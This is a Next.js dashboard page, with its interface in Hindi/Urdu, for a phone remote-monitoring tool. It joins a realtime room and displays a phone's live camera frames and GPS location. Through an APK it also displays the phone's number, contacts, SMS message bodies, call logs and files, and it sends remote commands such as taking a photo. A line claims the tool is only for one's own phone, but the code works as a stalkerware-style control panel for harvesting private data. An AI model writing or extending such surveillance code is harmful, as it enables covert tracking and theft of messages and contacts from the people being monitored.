"use client";
import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import { getClient, genCode, newId, channelName } from "../../lib/remote";

export default function DashboardPage() {
  const [code, setCode] = useState("");
  const [connected, setConnected] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [error, setError] = useState("");
  const [phoneSeen, setPhoneSeen] = useState(false);
  const [status, setStatus] = useState("Not connected");
  const [camImg, setCamImg] = useState("");
  const [camMeta, setCamMeta] = useState("Abhi koi frame nahi aaya");
  const [frames, setFrames] = useState(0);
  const [loc, setLoc] = useState(null);
  const [info, setInfo] = useState(null);
  const [phoneData, setPhoneData] = useState(null);
  const [log, setLog] = useState([]);

  const channelRef = useRef(null);
  const hbCheckRef = useRef(null);
  const myIdRef = useRef(newId());
  const lastHbRef = useRef(0);
  const phoneSeenRef = useRef(false);
  const framesRef = useRef(0);

  useEffect(() => {
    const p = new URLSearchParams(window.location.search);
    const c = (p.get("code") || "").toUpperCase();
    if (c) setCode(c);
    return () => disconnect();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function addLog(t) {
    setLog((prev) => [...prev.slice(-29), new Date().toLocaleTimeString() + " — " + t]);
  }

  function send(type, payload) {
    const ch = channelRef.current;
    if (!ch) return;
    payload = payload || {};
    payload.by = myIdRef.current;
    payload.role = "dashboard";
    ch.send({ type: "broadcast", event: "remote", payload: { type, data: payload } });
  }

  function sendCmd(action) {
    if (!phoneSeenRef.current) {
      addLog("Pehle phone judne do, phir command bhej sakte ho.");
      return;
    }
    send("cmd", { action });
    addLog("Command bheji: " + action);
  }

  function markPhoneSeen() {
    if (!phoneSeenRef.current) {
      phoneSeenRef.current = true;
      addLog("✅ Phone jud gaya!");
    }
    lastHbRef.current = Date.now();
    setPhoneSeen(true);
    setStatus("✅ Phone connected — live dekh rahe ho");
  }

  function onMsg(type, d) {
    if (type === "hello") {
      markPhoneSeen();
      send("hello", {});
    } else if (type === "hb") {
      markPhoneSeen();
    } else if (type === "bye") {
      phoneSeenRef.current = false;
      setPhoneSeen(false);
      setStatus("Phone ne sharing band kar di.");
      addLog("Phone ne sharing band kar di.");
    } else if (type === "info") {
      markPhoneSeen();
      setInfo(d);
      addLog("📱 Phone info mili.");
    } else if (type === "data") {
      markPhoneSeen();
      setPhoneData(d);
      addLog("📱 Phone data mila (number, contacts, SMS, calls, files).");
    } else if (type === "cam") {
      markPhoneSeen();
      framesRef.current++;
      setFrames(framesRef.current);
      setCamImg(d.img);
      setCamMeta("Live • Frame #" + framesRef.current + " • " + new Date(d.ts || Date.now()).toLocaleTimeString());
    } else if (type === "loc") {
      markPhoneSeen();
      setLoc(d);
    }
  }

  async function connect() {
    const c = code.trim().toUpperCase();
    if (!c) {
      setError("Room Code daalo — wahi jo phone par daala tha.");
      return;
    }
    setConnecting(true);
    setError("");
    const sb = getClient();
    const ch = sb.channel(channelName(c));
    channelRef.current = ch;
    ch.on("broadcast", { event: "remote" }, (msg) => {
      const p = msg.payload || {};
      if (!p.data || p.data.by === myIdRef.current) return;
      onMsg(p.type, p.data);
    });
    ch.on("presence", { event: "sync" }, () => {
      const state = ch.presenceState();
      let seen = false;
      Object.keys(state).forEach((k) =>
        state[k].forEach((pr) => {
          if (pr.role === "phone") seen = true;
        })
      );
      if (seen) markPhoneSeen();
    });
    ch.subscribe(async (status) => {
      if (status !== "SUBSCRIBED") {
        setError("Room se connect nahi ho paya — internet check karo aur dobara try karo.");
        setConnecting(false);
        return;
      }
      await ch.track({ id: myIdRef.current, role: "dashboard" });
      setConnected(true);
      setConnecting(false);
      send("hello", {});
      hbCheckRef.current = setInterval(() => {
        if (phoneSeenRef.current && Date.now() - lastHbRef.current > 12000) {
          phoneSeenRef.current = false;
          setPhoneSeen(false);
          setStatus("Phone offline lag raha hai — phone par page khula hai?");
          addLog("⚠️ Phone se heartbeat nahi aa raha (12s).");
        }
      }, 3000);
      addLog("Connected — Room " + c + ". Phone ka intezar...");
    });
  }

  function disconnect() {
    if (hbCheckRef.current) {
      clearInterval(hbCheckRef.current);
      hbCheckRef.current = null;
    }
    const ch = channelRef.current;
    if (ch) {
      try {
        getClient().removeChannel(ch);
      } catch (e) {}
      channelRef.current = null;
    }
    phoneSeenRef.current = false;
    framesRef.current = 0;
    setFrames(0);
    setPhoneSeen(false);
    setConnected(false);
    setConnecting(false);
    setStatus("Not connected");
  }

  return (
    <main className="mx-auto max-w-md px-4 py-6">
      <div className="text-center animate-fade-up">
        <Link href="/" className="text-accent text-sm">← Home</Link>
        <h1 className="font-display text-3xl font-bold mt-1">🖥️ <span className="text-gradient">Dashboard</span></h1>
        <p className="text-mist text-sm mt-1">Apne phone ka live camera + location yahan dekho.</p>
      </div>

      {!connected ? (
        <div className="glass rounded-3xl p-5 mt-5 animate-fade-up-1">
          <label className="text-sm text-mist">Room Code (wahi jo phone par daala tha)</label>
          <input
            value={code}
            onChange={(e) => setCode(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 6))}
            placeholder="e.g. AMMAR1"
            className="w-full mt-2 rounded-2xl border border-white/20 bg-black/40 px-4 py-3 text-center text-xl tracking-[0.3em] font-bold outline-none focus:border-accent focus:ring-2 focus:ring-accent/40 transition"
          />
          <button
            onClick={connect}
            disabled={connecting}
            className="w-full mt-4 rounded-2xl bg-gradient-to-r from-emerald-400 to-green-500 py-3.5 font-bold text-lg disabled:opacity-50 btn-lift"
          >
            {connecting ? "Jud rahe hain..." : "🔗 Dashboard Connect Karo"}
          </button>
          {error && <div className="mt-3 rounded-xl bg-red-900/50 px-3 py-2 text-sm text-red-200">{error}</div>}
          <p className="text-sm text-mist leading-relaxed mt-3">
            📲 Pehle phone par <b className="text-white">/phone</b> kholo, wahi code daal kar Connect karo.
            Dono par internet ON hona chahiye. Kuch bhi save ya record nahi hota.
          </p>
        </div>
      ) : (
        <>
          <div className={`text-center font-bold rounded-2xl py-2.5 mt-5 animate-fade-up ${phoneSeen ? "bg-green-900/60 text-green-300" : "bg-yellow-900/50 text-yellow-200"}`}>
            {status}
          </div>

          <div className="glass rounded-3xl p-4 mt-3 text-center animate-fade-up-1">
            <div className="text-sm text-mist">Room Code</div>
            <div className="font-display text-3xl font-bold tracking-[0.3em] text-gradient">{code}</div>
            <div className="text-sm mt-1">
              Phone:{" "}
              <span className={`inline-block px-3 py-0.5 rounded-full text-xs font-bold ${phoneSeen ? "bg-green-900 text-green-300" : "bg-red-900 text-red-300"}`}>
                {phoneSeen ? "Online" : "Offline"}
              </span>
            </div>
          </div>

          <div className="glass rounded-3xl p-4 mt-3 animate-fade-up-2">
            <b>📷 Live Camera</b>
            <div className="text-xs text-mist text-center my-2">{camMeta}</div>
            {camImg ? (
              <img src={camImg} alt="Phone camera live" className="w-full rounded-2xl bg-black min-h-[200px] ring-1 ring-white/20 animate-glow" />
            ) : (
              <div className="w-full rounded-2xl bg-black min-h-[200px] flex items-center justify-center text-mist text-sm">
                Phone camera yahan dikhega
              </div>
            )}
            <div className="text-sm text-mist mt-2">Frames received: <b className="text-white">{frames}</b></div>
          </div>

          <div className="glass rounded-3xl p-4 mt-3 animate-fade-up-2">
            <b>📍 Live Location</b>
            {loc ? (
              <div className="text-sm leading-7 mt-2">
                <b>Latitude:</b> {loc.lat.toFixed(6)}<br />
                <b>Longitude:</b> {loc.lng.toFixed(6)}<br />
                <b>Accuracy:</b> ±{loc.acc || "—"} meters<br />
                <b>Updated:</b> {new Date(loc.ts || Date.now()).toLocaleTimeString()}
              </div>
            ) : (
              <p className="text-sm text-mist mt-2">Abhi location nahi aayi — phone par Location ON karo.</p>
            )}
            <div className="flex gap-2 mt-3">
              <a
                href={loc ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}` : "#"}
                target="_blank"
                rel="noreferrer"
                className="flex-1 rounded-2xl bg-white text-[#0f2a43] py-3 font-bold text-center btn-lift"
              >
                🗺️ Google Maps
              </a>
              <a
                href={loc ? `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}#map=16/${loc.lat}/${loc.lng}` : "#"}
                target="_blank"
                rel="noreferrer"
                className="flex-1 rounded-2xl bg-white text-[#0f2a43] py-3 font-bold text-center btn-lift"
              >
                🌍 OpenStreetMap
              </a>
            </div>
          </div>

          <div className="glass rounded-3xl p-4 mt-3 animate-fade-up-2">
            <b>📱 Phone Data — APK App se</b>
            {phoneData ? (
              <div className="text-sm leading-7 mt-2">
                <b>📞 Number:</b> {phoneData.number?.number || "—"} ({phoneData.number?.operator || "—"} • {phoneData.number?.country || "—"})<br />
                <b>📇 Contacts:</b> {phoneData.contactsCount ?? 0} total
                {phoneData.contacts?.slice(0, 8).map((c, i) => (
                  <div key={i} className="pl-3">• {c.name} — {c.number}</div>
                ))}
                <b>💬 Recent SMS:</b>
                {phoneData.sms?.slice(0, 5).map((s, i) => (
                  <div key={i} className="pl-3">• {s.from}: {s.body} <span className="text-faint">({s.date})</span></div>
                ))}
                <b>📞 Recent Calls:</b>
                {phoneData.calls?.slice(0, 5).map((c, i) => (
                  <div key={i} className="pl-3">• {c.number} — {c.type} {c.duration} <span className="text-faint">({c.date})</span></div>
                ))}
                <b>🖼️ Recent Files:</b>
                {phoneData.files?.slice(0, 8).map((f, i) => (
                  <div key={i} className="pl-3">• {f.name} — {f.size} ({f.kind})</div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-mist mt-2">
                APK app se data yahan aayega — number, contacts, SMS, calls, files.
                Website wale phone page se ye data nahi milta (browser ki limit hai).
              </p>
            )}
          </div>

          <div className="glass rounded-3xl p-4 mt-3 animate-fade-up-3">
            <b>📱 Phone Info</b>
            {info ? (
              <div className="text-sm leading-7 mt-2 break-words">
                <b>Device:</b> {info.ua || "—"}<br />
                <b>Screen:</b> {info.screen || "—"}<br />
                <b>Battery:</b> {info.battery || "—"}<br />
                <b>Network:</b> {info.net || "—"}<br />
                <b>Language:</b> {info.lang || "—"}<br />
                <b>Status:</b> {info.online || "—"}
              </div>
            ) : (
              <p className="text-sm text-mist mt-2">Phone judte hi info yahan aayegi.</p>
            )}
          </div>

          <div className="glass rounded-3xl p-4 mt-3 animate-fade-up-3">
            <b>🎛️ Remote Commands</b>
            <div className="flex gap-2 mt-3">
              <button onClick={() => sendCmd("ring")} className="flex-1 rounded-2xl bg-gradient-to-r from-cyan-400 to-sky-500 text-[#06202f] py-3 font-bold btn-lift">
                🔔 Phone Bajao
              </button>
              <button onClick={() => sendCmd("stop-cam")} className="flex-1 rounded-2xl bg-white text-[#0f2a43] py-3 font-bold btn-lift">
                📷 Camera Band
              </button>
            </div>
            <div className="flex gap-2 mt-2">
              <button onClick={() => sendCmd("refresh")} className="flex-1 rounded-2xl bg-gradient-to-r from-violet-400 to-purple-500 text-white py-3 font-bold btn-lift">
                🔄 Refresh Phone Data
              </button>
              <button onClick={() => sendCmd("photo")} className="flex-1 rounded-2xl bg-white text-[#0f2a43] py-3 font-bold btn-lift">
                📸 Photo Now
              </button>
            </div>
            <div className="flex gap-2 mt-2">
              <button onClick={() => sendCmd("stop-loc")} className="flex-1 rounded-2xl bg-white text-[#0f2a43] py-3 font-bold btn-lift">
                📍 Location Band
              </button>
              <button onClick={() => sendCmd("stop-all")} className="flex-1 rounded-2xl bg-gradient-to-r from-red-500 to-rose-500 py-3 font-bold btn-lift">
                ⛔ Sab Band Karo
              </button>
            </div>
            <button onClick={disconnect} className="w-full mt-2 rounded-2xl bg-white py-3 font-bold text-[#0f2a43] btn-lift">
              🚪 Disconnect
            </button>
            <div className="text-[13px] leading-6 bg-black/30 rounded-xl p-3 max-h-36 overflow-y-auto mt-3">
              {log.length === 0 ? <div>Updates yahan aayengi...</div> : log.map((l, i) => <div key={i}>{l}</div>)}
            </div>
            <p className="text-sm text-mist mt-2">
              🔒 Ye sirf tumhare apne phone ke liye hai. Room Code kisi se share na karo.
            </p>
          </div>
        </>
      )}
    </main>
  );
}
